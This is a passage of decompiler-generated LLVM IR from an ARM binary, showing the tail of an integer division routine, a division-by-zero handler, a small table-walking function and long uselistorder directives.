  br i1 %v3_141bc, label %.thread2.thread7, label %dec_label_pc_141c8.loopexit

.thread2.thread7:                                 ; preds = %bb86
  %v2_141c09 = add i32 %storemerge111, 4
  %v2_141b4 = icmp ugt i32 %v4_141bc, 268435455
  br i1 %v2_141b4, label %.thread1, label %bb85

dec_label_pc_141c8thread-pre-split.loopexit.loopexit: ; preds = %bb85
  br label %dec_label_pc_141c8thread-pre-split.loopexit

dec_label_pc_141c8thread-pre-split.loopexit:      ; preds = %dec_label_pc_141c8thread-pre-split.loopexit.loopexit, %.thread1
  %v0_141c8.pr35108 = phi i32 [ %v0_141c8.pr35.lcssa, %.thread1 ], [ %v0_141c8.pr35110, %dec_label_pc_141c8thread-pre-split.loopexit.loopexit ]
  %storemerge105 = phi i32 [ %storemerge.lcssa, %.thread1 ], [ %storemerge111, %dec_label_pc_141c8thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_141c8thread-pre-split

dec_label_pc_141c8thread-pre-split:               ; preds = %.thread4, %dec_label_pc_141c8thread-pre-split.loopexit
  %v1_141d441 = phi i32 [ %storemerge105, %dec_label_pc_141c8thread-pre-split.loopexit ], [ %v2_141d4, %.thread4 ]
  %v2_141cc36 = phi i32 [ %v1_1419c, %dec_label_pc_141c8thread-pre-split.loopexit ], [ %v2_141cc, %.thread4 ]
  %v0_141c8.pr = phi i32 [ %v0_141c8.pr35108, %dec_label_pc_141c8thread-pre-split.loopexit ], [ %v3_141d0, %.thread4 ]
  br label %dec_label_pc_141c8

dec_label_pc_141c8.loopexit:                      ; preds = %bb86
  br label %dec_label_pc_141c8

dec_label_pc_141c8:                               ; preds = %dec_label_pc_141c8.loopexit, %dec_label_pc_141c8thread-pre-split
  %v0_141dc.pr = phi i32 [ %v1_141d441, %dec_label_pc_141c8thread-pre-split ], [ %storemerge111, %dec_label_pc_141c8.loopexit ]
  %v2_141cc = phi i32 [ %v2_141cc36, %dec_label_pc_141c8thread-pre-split ], [ %v1_1419c, %dec_label_pc_141c8.loopexit ]
  %v1_141d0 = phi i32 [ %v0_141c8.pr, %dec_label_pc_141c8thread-pre-split ], [ %v4_141bc, %dec_label_pc_141c8.loopexit ]
  %v2_141c8 = icmp slt i32 %v1_141d0, 0
  br i1 %v2_141c8, label %dec_label_pc_141dc, label %bb87

bb87:                                             ; preds = %dec_label_pc_141c8
  %v4_141cc = icmp ult i32 %v1_141d0, %v2_141cc
  br i1 %v4_141cc, label %.thread4, label %dec_label_pc_141dc

.thread4:                                         ; preds = %bb87
  %v3_141d0 = mul i32 %v1_141d0, 2
  %v2_141d4 = add i32 %v0_141dc.pr, 1
  br label %dec_label_pc_141c8thread-pre-split

dec_label_pc_141dc:                               ; preds = %bb87, %dec_label_pc_141c8
  %v2_141dc = add i32 %v0_141dc.pr, -3
  %v5_141e0 = icmp slt i32 %v0_141dc.pr, 3
  br i1 %v5_141e0, label %dec_label_pc_14220, label %dec_label_pc_141e4

dec_label_pc_141e4:                               ; preds = %dec_label_pc_141dc, %bb91
  %v6_1420c = phi i32 [ %v0_14214, %bb91 ], [ %v2_141dc, %dec_label_pc_141dc ]
  %v1_141e8 = phi i32 [ %v1_141f0.v6_141f0.v6_141f8.v6_14200, %bb91 ], [ %v2_141cc, %dec_label_pc_141dc ]
  %v3_1420810 = phi i32 [ %v3_14208, %bb91 ], [ %v1_141d0, %dec_label_pc_141dc ]
  %v3_141e4 = icmp ult i32 %v1_141e8, %v3_1420810
  %v3_141e8 = select i1 %v3_141e4, i32 0, i32 %v3_1420810
  %v1_141f0 = sub i32 %v1_141e8, %v3_141e8
  %v4_141ec = udiv i32 %v3_1420810, 2
  %v6_141ec = icmp ult i32 %v1_141f0, %v4_141ec
  %v6_141f0 = select i1 %v6_141ec, i32 0, i32 %v4_141ec
  %v1_141f0.v6_141f0 = sub i32 %v1_141f0, %v6_141f0
  %.demorgan = and i1 %v3_141e4, %v6_141ec
  %v4_141f4 = udiv i32 %v3_1420810, 4
  %v6_141f4 = icmp ult i32 %v1_141f0.v6_141f0, %v4_141f4
  %v6_141f8 = select i1 %v6_141f4, i32 0, i32 %v4_141f4
  %v1_141f0.v6_141f0.v6_141f8 = sub i32 %v1_141f0.v6_141f0, %v6_141f8
  %.demorgan76 = and i1 %.demorgan, %v6_141f4
  %v4_141fc = udiv i32 %v3_1420810, 8
  %v6_141fc = icmp ult i32 %v1_141f0.v6_141f0.v6_141f8, %v4_141fc
  %v6_14200 = select i1 %v6_141fc, i32 0, i32 %v4_141fc
  %v1_141f0.v6_141f0.v6_141f8.v6_14200 = sub i32 %v1_141f0.v6_141f0.v6_141f8, %v6_14200
  %.demorgan77 = and i1 %.demorgan76, %v6_141fc
  br i1 %.demorgan77, label %bb89, label %bb88

bb88:                                             ; preds = %dec_label_pc_141e4
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_141e4, %bb88
  %v2_14204 = add i32 %v1_141f0.v6_141f0.v6_141f8.v6_14200, -1
  %v4_14204 = sub i32 0, %v1_141f0.v6_141f0.v6_141f8.v6_14200
  %v5_14204 = and i32 %v1_141f0.v6_141f0.v6_141f8.v6_14200, %v4_14204
  %v3_14208 = udiv i32 %v3_1420810, 16
  %v5_1420c = icmp slt i32 %v1_141f0.v6_141f0.v6_141f8.v6_14200, 1
  br i1 %v5_1420c, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v7_1420c = add i32 %v6_1420c, -4
  %v9_1420c = sub i32 3, %v6_1420c
  %v10_1420c = and i32 %v9_1420c, %v6_1420c
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v0_14214 = phi i32 [ %v6_1420c, %bb89 ], [ %v7_1420c, %bb90 ]
  %v0_1421013.in = phi i32 [ %v2_14204, %bb89 ], [ %v7_1420c, %bb90 ]
  %v1_1421012.in = phi i32 [ %v5_14204, %bb89 ], [ %v10_1420c, %bb90 ]
  %v1_1421012 = icmp slt i32 %v1_1421012.in, 0
  %v0_1421013 = icmp slt i32 %v0_1421013.in, 0
  %v2_14210 = xor i1 %v0_1421013, %v1_1421012
  br i1 %v2_14210, label %dec_label_pc_14214, label %dec_label_pc_141e4

dec_label_pc_14214:                               ; preds = %bb91
  %v1_14214 = urem i32 %v0_14214, 4
  %v2_14214 = icmp eq i32 %v1_14214, 0
  br i1 %v2_14214, label %.thread6, label %bb92

bb92:                                             ; preds = %dec_label_pc_14214
  %v3_14218 = icmp eq i32 %v1_141f0.v6_141f0.v6_141f8.v6_14200, 0
  br i1 %v3_14218, label %.thread6, label %dec_label_pc_14220

dec_label_pc_14220:                               ; preds = %bb92, %dec_label_pc_141dc
  %v0_14234 = phi i32 [ %v3_14208, %bb92 ], [ %v1_141d0, %dec_label_pc_141dc ]
  %v1_14230 = phi i32 [ %v1_141f0.v6_141f0.v6_141f8.v6_14200, %bb92 ], [ %v2_141cc, %dec_label_pc_141dc ]
  %v0_14220 = phi i32 [ %v0_14214, %bb92 ], [ %v2_141dc, %dec_label_pc_141dc ]
  %v5_14224 = icmp slt i32 %v0_14220, -2
  br i1 %v5_14224, label %dec_label_pc_14244, label %dec_label_pc_14228

dec_label_pc_14228:                               ; preds = %dec_label_pc_14220
  %v8_14220 = icmp eq i32 %v0_14220, -2
  br i1 %v8_14220, label %dec_label_pc_14238, label %dec_label_pc_1422c

dec_label_pc_1422c:                               ; preds = %dec_label_pc_14228
  %v3_1422c = icmp ult i32 %v1_14230, %v0_14234
  br i1 %v3_1422c, label %bb94, label %bb93

bb93:                                             ; preds = %dec_label_pc_1422c
  %v2_1422c = sub i32 %v1_14230, %v0_14234
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_1422c, %bb93
  %v0_1423854 = phi i32 [ %v1_14230, %dec_label_pc_1422c ], [ %v2_1422c, %bb93 ]
  %v3_14234 = udiv i32 %v0_14234, 2
  br label %dec_label_pc_14238

dec_label_pc_14238:                               ; preds = %dec_label_pc_14228, %bb94
  %v0_14240 = phi i32 [ %v0_14234, %dec_label_pc_14228 ], [ %v3_14234, %bb94 ]
  %v1_1423c = phi i32 [ %v1_14230, %dec_label_pc_14228 ], [ %v0_1423854, %bb94 ]
  %v3_14238 = icmp ult i32 %v1_1423c, %v0_14240
  br i1 %v3_14238, label %bb96, label %bb95

bb95:                                             ; preds = %dec_label_pc_14238
  %v2_14238 = sub i32 %v1_1423c, %v0_14240
  br label %bb96

bb96:                                             ; preds = %dec_label_pc_14238, %bb95
  %v0_1424457 = phi i32 [ %v1_1423c, %dec_label_pc_14238 ], [ %v2_14238, %bb95 ]
  %v3_14240 = udiv i32 %v0_14240, 2
  br label %dec_label_pc_14244

dec_label_pc_14244:                               ; preds = %dec_label_pc_14220, %bb96
  %v2_14248 = phi i32 [ %v0_14234, %dec_label_pc_14220 ], [ %v3_14240, %bb96 ]
  %v1_14248 = phi i32 [ %v1_14230, %dec_label_pc_14220 ], [ %v0_1424457, %bb96 ]
  %v3_14244 = icmp ult i32 %v1_14248, %v2_14248
  br i1 %v3_14244, label %.thread6, label %bb97

bb97:                                             ; preds = %dec_label_pc_14244
  %v2_14244 = sub i32 %v1_14248, %v2_14248
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_14244, %bb83, %.thread72, %dec_label_pc_14214, %bb92, %bb97
  %v1_14250 = phi i32 [ %v1_141f0.v6_141f0.v6_141f8.v6_14200, %dec_label_pc_14214 ], [ 0, %bb92 ], [ %v1_14248, %dec_label_pc_14244 ], [ %v2_14244, %bb97 ], [ %v3_141a8, %.thread72 ], [ %v1_1419c, %bb83 ]
  br i1 %v1_14190, label %bb98, label %bb99

bb98:                                             ; preds = %.thread6
  %v2_14250 = sub i32 0, %v1_14250
  br label %bb99

bb99:                                             ; preds = %.thread6, %bb98
  %v1_14254 = phi i32 [ %v1_14250, %.thread6 ], [ %v2_14250, %bb98 ]
  ret i32 %v1_14254

dec_label_pc_14258:                               ; preds = %entry
  %v0_14258 = load i32, i32* @lr, align 4
  %v0_1425c = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_14258)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_14234, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_14214, { 1, 0, 2 }
  uselistorder i32 %v7_1420c, { 1, 0 }
  uselistorder i32 %v3_14208, { 1, 0 }
  uselistorder i32 %v1_141f0.v6_141f0.v6_141f8.v6_14200, { 0, 1, 2, 7, 5, 6, 4, 3 }
  uselistorder i32 %v4_141fc, { 1, 0 }
  uselistorder i32 %v4_141f4, { 1, 0 }
  uselistorder i32 %v4_141ec, { 1, 0 }
  uselistorder i32 %v6_1420c, { 3, 0, 2, 1 }
  uselistorder i32 %v2_141dc, { 1, 0 }
  uselistorder i32 %v1_141d0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_141cc, { 1, 0, 3, 2 }
  uselistorder i32 %v4_141bc, { 1, 0, 3, 2 }
  uselistorder i32 %v0_141c8.pr35110, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1419c, { 0, 2, 3, 1, 4, 6, 5 }
  uselistorder i32 %v4_141a4, { 1, 0, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 ()* @__aeabi_ldiv0, { 2, 1, 0 }
  uselistorder i32* @lr, { 9, 10, 11, 5, 2, 3, 0, 6, 1, 7, 4, 8 }
  uselistorder i32 -2, { 0, 12, 1, 13, 2, 3, 10, 8, 9, 7, 6, 5, 4, 20, 21, 22, 23, 11, 19, 18, 17, 16, 15, 14 }
  uselistorder i32 8, { 6, 7, 50, 18, 8, 9, 15, 10, 56, 39, 24, 57, 40, 25, 58, 41, 26, 11, 12, 13, 52, 42, 59, 23, 104, 105, 106, 107, 109, 43, 110, 111, 108, 60, 61, 44, 62, 14, 45, 63, 27, 64, 65, 66, 67, 68, 69, 70, 71, 72, 3, 73, 74, 75, 4, 76, 77, 78, 79, 80, 81, 82, 5, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 28, 94, 29, 95, 30, 96, 31, 97, 32, 98, 33, 99, 34, 100, 35, 101, 36, 102, 46, 103, 0, 1, 112, 113, 114, 115, 49, 116, 117, 47, 118, 2, 16, 19, 20, 119, 17, 21, 22, 120, 48, 53, 54, 121, 122, 124, 123, 125, 126, 37, 127, 51, 55, 38, 128 }
  uselistorder i32 3, { 63, 19, 64, 20, 161, 65, 74, 34, 21, 23, 75, 37, 76, 2, 77, 78, 79, 80, 35, 4, 146, 147, 148, 1, 38, 149, 39, 150, 40, 151, 41, 152, 42, 153, 43, 154, 22, 155, 44, 156, 36, 157, 45, 81, 46, 82, 83, 24, 86, 47, 48, 49, 50, 51, 0, 84, 85, 52, 87, 88, 89, 90, 91, 92, 53, 93, 54, 94, 25, 95, 96, 97, 98, 99, 6, 5, 55, 26, 100, 101, 102, 103, 104, 105, 106, 8, 7, 56, 107, 27, 108, 109, 110, 111, 112, 113, 114, 115, 10, 9, 57, 116, 28, 117, 118, 119, 120, 121, 12, 11, 58, 122, 29, 123, 124, 125, 126, 59, 127, 14, 13, 31, 128, 30, 129, 130, 131, 132, 133, 134, 16, 15, 60, 135, 32, 136, 137, 138, 139, 140, 141, 142, 18, 17, 61, 143, 33, 144, 145, 3, 158, 159, 66, 70, 67, 71, 68, 72, 69, 73, 62, 160 }
  uselistorder i32 -3, { 0, 1, 3, 2 }
  uselistorder i32 2, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 129, 12, 13, 14, 15, 16, 66, 67, 45, 46, 56, 133, 57, 70, 135, 142, 58, 134, 69, 136, 59, 137, 60, 138, 61, 139, 62, 140, 63, 141, 64, 147, 143, 144, 145, 146, 53, 71, 228, 17, 18, 229, 231, 72, 233, 49, 131, 44, 73, 235, 74, 236, 75, 237, 76, 238, 239, 68, 240, 19, 77, 230, 154, 155, 20, 78, 79, 156, 157, 80, 216, 130, 132, 162, 82, 148, 85, 149, 84, 150, 81, 86, 151, 21, 22, 23, 87, 83, 88, 89, 90, 152, 153, 91, 92, 54, 94, 95, 93, 96, 158, 47, 52, 159, 160, 161, 232, 234, 163, 164, 165, 166, 167, 168, 169, 98, 170, 97, 171, 172, 173, 174, 175, 100, 99, 176, 177, 178, 179, 180, 181, 182, 102, 183, 101, 184, 185, 103, 104, 105, 186, 187, 188, 189, 190, 191, 192, 0, 24, 25, 26, 27, 28, 29, 106, 193, 65, 194, 195, 196, 197, 198, 1, 30, 31, 32, 33, 34, 35, 108, 107, 199, 200, 36, 201, 202, 50, 203, 110, 204, 2, 37, 38, 39, 40, 41, 111, 205, 109, 206, 207, 208, 209, 210, 211, 212, 213, 113, 214, 112, 215, 217, 218, 219, 115, 220, 116, 221, 222, 223, 224, 117, 225, 114, 226, 227, 118, 55, 241, 48, 119, 242, 243, 126, 244, 127, 245, 120, 246, 121, 122, 247, 123, 248, 124, 249, 125, 250, 51, 251, 42, 43, 252, 128, 253 }
  uselistorder i32 4, { 5, 6, 61, 7, 8, 62, 377, 378, 166, 9, 10, 167, 90, 70, 349, 350, 54, 170, 91, 171, 126, 172, 314, 315, 316, 188, 189, 53, 52, 317, 173, 174, 168, 169, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 92, 191, 192, 193, 190, 63, 318, 93, 194, 71, 94, 95, 11, 319, 12, 320, 321, 13, 14, 322, 323, 45, 324, 46, 329, 96, 330, 97, 331, 98, 332, 99, 333, 100, 334, 101, 336, 102, 337, 338, 335, 325, 103, 326, 327, 328, 202, 127, 204, 15, 205, 206, 203, 16, 207, 47, 104, 208, 209, 277, 211, 195, 57, 56, 55, 196, 105, 17, 18, 19, 20, 21, 22, 197, 48, 198, 49, 199, 200, 201, 23, 24, 106, 72, 107, 108, 128, 210, 0, 109, 25, 212, 213, 129, 214, 215, 216, 130, 131, 111, 217, 110, 218, 73, 219, 220, 132, 221, 222, 133, 134, 223, 74, 224, 75, 225, 226, 135, 136, 227, 137, 228, 229, 138, 139, 64, 230, 76, 231, 77, 232, 233, 234, 235, 236, 112, 237, 78, 238, 239, 240, 140, 241, 242, 243, 244, 141, 142, 2, 245, 113, 246, 79, 247, 248, 249, 143, 250, 251, 144, 145, 3, 65, 252, 80, 253, 81, 254, 255, 146, 256, 257, 258, 259, 260, 147, 148, 261, 262, 114, 263, 4, 66, 264, 82, 265, 115, 266, 267, 268, 269, 270, 149, 271, 272, 273, 150, 151, 116, 274, 67, 83, 275, 84, 276, 278, 279, 280, 281, 282, 117, 283, 118, 284, 152, 285, 286, 287, 153, 154, 119, 288, 68, 289, 85, 290, 86, 291, 155, 292, 293, 26, 156, 294, 295, 27, 157, 296, 297, 28, 158, 298, 299, 29, 159, 300, 301, 30, 302, 160, 303, 304, 31, 161, 305, 306, 32, 162, 307, 308, 33, 163, 309, 310, 34, 164, 311, 312, 35, 351, 313, 339, 340, 341, 342, 343, 344, 36, 345, 346, 1, 347, 165, 348, 352, 374, 125, 353, 89, 354, 355, 69, 356, 120, 357, 358, 359, 360, 87, 361, 121, 362, 363, 364, 88, 365, 122, 366, 37, 38, 39, 367, 368, 60, 59, 58, 369, 40, 41, 42, 123, 370, 124, 371, 43, 44, 372, 50, 373, 51, 375, 376 }
  uselistorder i32 16, { 4, 5, 6, 7, 8, 21, 9, 10, 0, 11, 12, 36, 137, 37, 63, 27, 38, 64, 65, 138, 139, 140, 22, 62, 141, 13, 14, 20, 60, 15, 142, 16, 39, 40, 68, 28, 69, 26, 66, 29, 67, 30, 41, 42, 43, 44, 45, 46, 47, 70, 48, 49, 23, 71, 72, 73, 74, 50, 75, 76, 77, 78, 79, 80, 51, 81, 82, 83, 32, 84, 31, 85, 86, 53, 87, 88, 89, 90, 91, 1, 52, 92, 93, 94, 55, 95, 96, 97, 98, 99, 2, 54, 100, 56, 101, 102, 103, 17, 104, 18, 105, 61, 19, 57, 58, 106, 107, 3, 34, 108, 33, 109, 110, 111, 112, 113, 114, 24, 115, 116, 117, 118, 120, 119, 121, 122, 123, 124, 125, 126, 127, 25, 128, 129, 130, 131, 132, 134, 133, 135, 136, 143, 144, 145, 146, 147, 59, 148, 35, 149, 150, 151, 152, 153 }
  uselistorder i32 268435455, { 2, 0, 3, 1, 4 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %.thread6, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_14244, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_14238, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_141e4, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
}

define i32 @__aeabi_ldiv0() local_unnamed_addr {
entry:
  %v1_14268 = load i32, i32* @r0, align 4
  ret i32 %v1_14268
}

define i32 @function_1426c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1426c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14270 = load i32, i32* @global_var_1cb08.648, align 4
  %v7_14274 = icmp eq i32 %v3_14270, -1
  %v3_14278 = load i32, i32* @r4, align 4
  store i32 %v3_14278, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_1cb08.648 to i32), i32* %r4.global-to-local, align 4
  br i1 %v7_14274, label %bb, label %.preheader

bb:                                               ; preds = %dec_label_pc_1426c
  store i32 %v3_14278, i32* %r4.global-to-local, align 4
  %v9_14280 = load i32, i32* @r0, align 4
  ret i32 %v9_14280

.preheader:                                       ; preds = %dec_label_pc_1426c, %.preheader
  %v0_14288 = phi i32 [ %v3_1428c, %.preheader ], [ %v3_14270, %dec_label_pc_1426c ]
  call void @__pseudo_branch(i32 %v0_14288)
  %v0_1428c = load i32, i32* %r4.global-to-local, align 4
  %v1_1428c = add i32 %v0_1428c, -4
  %v2_1428c = inttoptr i32 %v1_1428c to i32*
  %v3_1428c = load i32, i32* %v2_1428c, align 4
  store i32 %v1_1428c, i32* %r4.global-to-local, align 4
  %v3_14290 = icmp eq i32 %v3_1428c, -1
  br i1 %v3_14290, label %dec_label_pc_14298, label %.preheader

dec_label_pc_14298:                               ; preds = %.preheader
  %v2_14298 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14298, i32* %r4.global-to-local, align 4
  %v8_14298 = load i32, i32* @r0, align 4
  ret i32 %v8_14298

; uselistorder directives
  uselistorder i32 %v3_1428c, { 1, 0 }
  uselistorder i32 %v3_14270, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 4, 0, 2, 1, 3 }
  uselistorder i32 -4, { 12, 0, 1, 8, 2, 3, 4, 5, 9, 6, 7, 10, 11 }
  uselistorder i32 -1, { 116, 0, 117, 118, 119, 120, 121, 122, 123, 124, 1, 2, 3, 4, 5, 89, 90, 6, 125, 126, 11, 127, 231, 10, 128, 88, 87, 232, 7, 129, 218, 92, 219, 221, 222, 130, 131, 132, 91, 220, 12, 133, 82, 13, 134, 135, 14, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 223, 8, 156, 9, 157, 158, 15, 159, 160, 93, 233, 161, 16, 162, 234, 83, 17, 18, 163, 86, 19, 20, 21, 22, 23, 94, 228, 164, 229, 165, 230, 102, 224, 24, 100, 225, 25, 26, 101, 226, 27, 28, 103, 227, 29, 30, 31, 32, 33, 166, 76, 77, 78, 79, 80, 81, 34, 35, 36, 167, 168, 169, 170, 37, 96, 97, 98, 99, 38, 39, 40, 171, 41, 42, 43, 44, 84, 45, 46, 47, 48, 49, 50, 51, 172, 52, 95, 53, 54, 55, 173, 56, 57, 58, 59, 174, 60, 61, 62, 175, 63, 64, 65, 66, 67, 68, 69, 176, 70, 71, 72, 177, 73, 74, 178, 179, 180, 181, 75, 85, 235, 236, 109, 237, 107, 238, 108, 239, 105, 240, 182, 183, 184, 185, 186, 110, 241, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 104, 242, 111, 243, 213, 214, 215, 216, 217, 106, 244, 112, 245, 113, 114, 115 }
  uselistorder i32 1, { 525, 9, 354, 984, 985, 355, 986, 987, 273, 988, 885, 886, 887, 289, 888, 528, 527, 526, 249, 248, 243, 244, 246, 245, 242, 241, 247, 0, 889, 890, 891, 892, 251, 250, 1, 893, 894, 895, 896, 297, 897, 898, 298, 899, 530, 529, 252, 253, 705, 706, 707, 390, 531, 228, 227, 226, 224, 225, 900, 313, 314, 2, 3, 901, 902, 904, 903, 391, 905, 200, 199, 872, 213, 906, 907, 908, 31, 30, 32, 909, 532, 216, 215, 217, 219, 220, 223, 221, 222, 218, 910, 911, 533, 204, 203, 202, 201, 205, 206, 912, 913, 534, 122, 121, 120, 119, 123, 124, 392, 639, 393, 640, 356, 641, 642, 807, 643, 657, 401, 637, 638, 402, 644, 316, 403, 404, 399, 645, 646, 400, 647, 648, 398, 649, 650, 397, 651, 652, 396, 653, 654, 395, 655, 656, 394, 658, 659, 808, 405, 809, 406, 810, 812, 813, 811, 814, 407, 815, 636, 315, 818, 816, 408, 817, 820, 409, 821, 826, 346, 827, 828, 292, 410, 829, 411, 830, 412, 831, 413, 832, 414, 833, 415, 834, 416, 835, 417, 836, 418, 837, 419, 838, 420, 839, 421, 840, 422, 841, 423, 842, 424, 843, 425, 844, 426, 845, 427, 846, 428, 847, 429, 848, 430, 849, 431, 850, 432, 851, 433, 852, 434, 853, 435, 854, 436, 855, 437, 856, 438, 857, 439, 858, 440, 859, 441, 860, 442, 861, 443, 862, 444, 863, 445, 864, 317, 870, 871, 290, 446, 548, 547, 546, 545, 544, 543, 542, 541, 540, 539, 538, 537, 536, 535, 259, 262, 258, 265, 268, 266, 267, 261, 260, 263, 264, 865, 866, 447, 867, 868, 448, 869, 549, 167, 165, 166, 159, 158, 162, 164, 163, 161, 157, 160, 819, 449, 551, 550, 255, 257, 254, 256, 666, 667, 668, 669, 670, 671, 672, 274, 284, 673, 674, 318, 275, 675, 676, 677, 678, 276, 283, 679, 680, 319, 277, 681, 450, 683, 684, 451, 685, 682, 686, 351, 687, 299, 690, 691, 688, 689, 279, 278, 280, 692, 452, 693, 558, 557, 517, 556, 555, 554, 516, 553, 552, 50, 48, 49, 57, 52, 54, 58, 55, 61, 56, 51, 60, 53, 59, 559, 62, 796, 300, 795, 345, 560, 43, 44, 42, 40, 39, 46, 47, 38, 41, 45, 716, 717, 718, 453, 562, 561, 87, 89, 97, 84, 86, 83, 96, 88, 94, 95, 98, 85, 90, 91, 93, 92, 563, 361, 660, 661, 357, 662, 454, 456, 455, 457, 663, 664, 458, 459, 460, 462, 461, 463, 464, 360, 359, 358, 665, 465, 576, 575, 574, 573, 518, 572, 519, 571, 570, 569, 568, 567, 520, 566, 565, 564, 33, 34, 36, 37, 35, 694, 577, 468, 467, 466, 695, 579, 578, 269, 469, 696, 330, 697, 329, 698, 328, 699, 327, 700, 701, 470, 336, 320, 702, 471, 703, 472, 704, 291, 473, 593, 592, 591, 590, 589, 588, 587, 586, 585, 584, 583, 582, 581, 580, 136, 134, 135, 139, 137, 138, 133, 713, 5, 708, 474, 709, 4, 710, 347, 711, 293, 294, 712, 714, 348, 715, 598, 597, 596, 521, 595, 522, 594, 76, 77, 822, 362, 823, 363, 824, 6, 825, 7, 8, 719, 720, 721, 722, 723, 724, 295, 296, 725, 726, 727, 728, 729, 730, 731, 732, 475, 733, 734, 476, 735, 736, 739, 737, 738, 601, 600, 599, 186, 184, 182, 188, 181, 185, 183, 190, 194, 193, 192, 189, 187, 180, 191, 740, 741, 742, 743, 744, 477, 301, 478, 603, 602, 240, 236, 232, 231, 230, 229, 238, 239, 233, 237, 234, 235, 745, 746, 747, 479, 748, 749, 750, 751, 752, 753, 480, 754, 302, 481, 365, 364, 482, 755, 604, 173, 170, 169, 171, 168, 176, 177, 179, 178, 175, 174, 172, 756, 352, 282, 757, 483, 759, 758, 281, 484, 367, 366, 523, 605, 195, 196, 198, 197, 760, 761, 762, 763, 764, 765, 485, 766, 303, 486, 487, 767, 368, 768, 606, 103, 99, 100, 101, 102, 107, 108, 110, 109, 105, 106, 104, 769, 770, 331, 771, 772, 773, 488, 774, 304, 489, 370, 369, 490, 775, 491, 776, 607, 207, 210, 211, 212, 209, 208, 777, 778, 332, 779, 780, 781, 492, 782, 305, 493, 375, 374, 494, 783, 371, 784, 372, 785, 373, 786, 612, 611, 610, 609, 608, 126, 129, 130, 132, 131, 125, 128, 127, 787, 788, 789, 333, 790, 791, 792, 306, 495, 378, 377, 496, 793, 376, 794, 613, 16, 15, 14, 12, 11, 18, 19, 21, 20, 13, 17, 797, 798, 799, 334, 800, 801, 802, 307, 497, 381, 380, 498, 803, 379, 804, 618, 617, 616, 615, 614, 69, 68, 67, 66, 64, 63, 72, 73, 75, 74, 65, 71, 70, 805, 382, 499, 619, 22, 27, 25, 28, 24, 26, 29, 23, 914, 214, 806, 140, 620, 10, 873, 500, 876, 501, 877, 878, 874, 875, 879, 880, 881, 882, 308, 883, 309, 111, 115, 117, 112, 113, 114, 116, 884, 321, 502, 621, 80, 81, 79, 78, 82, 915, 118, 916, 285, 506, 337, 338, 917, 286, 504, 339, 340, 505, 918, 322, 919, 335, 920, 287, 341, 509, 342, 350, 288, 507, 343, 344, 508, 921, 323, 922, 923, 389, 924, 925, 926, 384, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 385, 939, 940, 941, 942, 943, 311, 944, 510, 945, 511, 512, 946, 947, 948, 949, 950, 386, 951, 952, 953, 324, 954, 387, 955, 956, 957, 325, 958, 388, 959, 960, 961, 326, 962, 963, 964, 965, 312, 966, 967, 968, 310, 503, 383, 969, 971, 973, 972, 970, 513, 974, 975, 976, 514, 977, 978, 979, 980, 353, 981, 982, 349, 515, 983, 633, 632, 631, 630, 629, 628, 627, 626, 625, 624, 623, 622, 145, 144, 141, 142, 143, 148, 154, 155, 147, 156, 149, 146, 150, 152, 151, 153, 634, 635, 272, 271, 270, 524 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @function_142a0() local_unnamed_addr {
dec_label_pc_142a0:
  %v5_142a4 = load i32, i32* @r0, align 4
  ret i32 %v5_142a4

; uselistorder directives
  uselistorder i32* @r0, { 2, 6, 7, 8, 104, 9, 105, 10, 106, 12, 11, 63, 64, 0, 17, 52, 53, 55, 56, 57, 58, 61, 54, 18, 19, 20, 3, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 59, 60, 1, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 65, 62, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 4, 5, 13, 14, 15, 16 }
}

define i32 @function_142a8() local_unnamed_addr {
entry:
  %v3_142ac = load i32, i32* @r4, align 4
  %v0_142b4 = call i32 @function_8e08()
  call void @__pseudo_branch(i32 %v3_142ac)
  ret i32 %v0_142b4

; uselistorder directives
  uselistorder void (i32)* @__pseudo_branch, { 0, 6, 8, 9, 10, 1, 2, 3, 4, 5, 7 }
